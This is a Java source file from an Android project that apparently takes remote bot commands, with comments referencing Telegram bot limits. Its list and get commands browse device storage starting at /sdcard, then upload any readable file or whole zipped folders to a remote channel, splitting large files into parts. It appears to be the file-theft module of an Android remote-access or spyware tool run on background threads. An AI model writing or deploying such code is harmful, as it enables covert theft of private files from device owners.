// language: Java, file: FileTransfer.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;
import android.os.Environment;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class FileTransfer {

    static final long MAX_INLINE = 49L * 1024 * 1024;  // Telegram bot doc limit 50 MB

    public static void list(String dirArg) {
        String dir = dirArg == null || dirArg.isEmpty() ? "/sdcard" : dirArg;
        Thread t = new Thread(() -> listSync(dir), "v2-ls");
        t.setDaemon(true);
        t.start();
    }

    static void listSync(String dir) {
        try {
            File d = new File(dir);
            if (!d.exists()) { SyncChannel.send("<i>nf: " + SyncChannel.esc(dir) + "</i>"); return; }
            if (!d.isDirectory()) { SyncChannel.send("<i>not a dir: " + SyncChannel.esc(dir) + "</i>"); return; }
            File[] fs = d.listFiles();
            if (fs == null) { SyncChannel.send("<i>empty or denied: " + SyncChannel.esc(dir) + "</i>"); return; }

            List<File> dirs = new ArrayList<>();
            List<File> files = new ArrayList<>();
            for (File f : fs) {
                if (f.isDirectory()) dirs.add(f); else files.add(f);
            }
            dirs.sort((a, b) -> a.getName().compareToIgnoreCase(b.getName()));
            files.sort((a, b) -> a.getName().compareToIgnoreCase(b.getName()));

            StringBuilder b = new StringBuilder();
            b.append("<b>").append(SyncChannel.esc(dir)).append("</b>\n")
             .append("<i>").append(dirs.size()).append(" dirs · ")
             .append(files.size()).append(" files</i>\n\n");
            for (File f : dirs) b.append("📁 ").append(SyncChannel.esc(f.getName())).append("/\n");
            for (File f : files) {
                b.append("📄 ").append(SyncChannel.esc(f.getName()))
                 .append(" · <i>").append(humanSize(f.length())).append("</i>\n");
                if (b.length() > 3500) {
                    SyncChannel.send(b.toString());
                    b.setLength(0);
                }
            }
            if (b.length() > 0) SyncChannel.send(b.toString());
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        }
    }

    public static void get(String path) {
        if (path == null || path.isEmpty()) {
            CommandDispatch.err("usage: /get PATH");
            return;
        }
        Thread t = new Thread(() -> getSync(path), "v2-get");
        t.setDaemon(true);
        t.start();
    }

    static void getSync(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) { SyncChannel.send("<i>nf: " + SyncChannel.esc(path) + "</i>"); return; }
            if (!f.canRead()) { SyncChannel.send("<i>denied: " + SyncChannel.esc(path) + "</i>"); return; }
            if (f.isDirectory()) {
                zipAndSend(f);
                return;
            }
            if (f.length() > MAX_INLINE) {
                SyncChannel.send("<i>too big (" + humanSize(f.length())
                    + "), streaming in parts…</i>");
                streamParts(f);
                return;
            }
            SyncChannel.sendFile(f, f.getName());
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        }
    }

    static void zipAndSend(File dir) {
        File zip = new File(SyncChannel.ctx.getCacheDir(),
            "d_" + System.currentTimeMillis() + ".zip");
        try {
            zipDir(dir, zip);
            SyncChannel.sendFile(zip, dir.getName() + ".zip");
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        } finally {
            try { zip.delete(); } catch (Throwable ignored) {}
        }
    }

    static void zipDir(File dir, File out) throws Exception {
        java.util.zip.ZipOutputStream zo = new java.util.zip.ZipOutputStream(
            new FileOutputStream(out));
        String base = dir.getAbsolutePath();
        java.util.ArrayDeque<File> stack = new java.util.ArrayDeque<>();
        stack.push(dir);
        while (!stack.isEmpty()) {
            File cur = stack.pop();
            File[] fs = cur.listFiles();
            if (fs == null) continue;
            for (File f : fs) {
                if (f.isDirectory()) stack.push(f);
                else {
                    String rel = f.getAbsolutePath().substring(base.length());
                    if (rel.startsWith("/")) rel = rel.substring(1);
                    zo.putNextEntry(new java.util.zip.ZipEntry(rel));
                    FileInputStream in = new FileInputStream(f);
                    byte[] buf = new byte[16 * 1024];
                    int n;
                    while ((n = in.read(buf)) > 0) zo.write(buf, 0, n);
                    in.close();
                    zo.closeEntry();
                }
            }
        }
        zo.close();
    }

    static void streamParts(File f) {
        try {
            long size = f.length();
            long part = 20L * 1024 * 1024;
            int total = (int) ((size + part - 1) / part);
            for (int i = 0; i < total; i++) {
                File tmp = new File(SyncChannel.ctx.getCacheDir(),
                    f.getName() + ".part" + (i + 1) + "of" + total);
                FileInputStream in = new FileInputStream(f);
                long skip = i * part;
                long skipped = 0;
                while (skipped < skip) {
                    long s = in.skip(skip - skipped);
                    if (s <= 0) break;
                    skipped += s;
                }
                FileOutputStream out = new FileOutputStream(tmp);
                byte[] buf = new byte[64 * 1024];
                long written = 0;
                int n;
                while (written < part && (n = in.read(buf)) > 0) {
                    out.write(buf, 0, n);
                    written += n;
                }
                in.close();
                out.close();
                SyncChannel.sendFile(tmp, tmp.getName());
                try { tmp.delete(); } catch (Throwable ignored) {}
            }
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        }
    }

    static String humanSize(long b) {
        if (b < 1024) return b + " B";
        if (b < 1024 * 1024) return String.format("%.1f KB", b / 1024.0);
        if (b < 1024L * 1024 * 1024) return String.format("%.1f MB", b / 1024.0 / 1024.0);
        return String.format("%.2f GB", b / 1024.0 / 1024.0 / 1024.0);
    }
}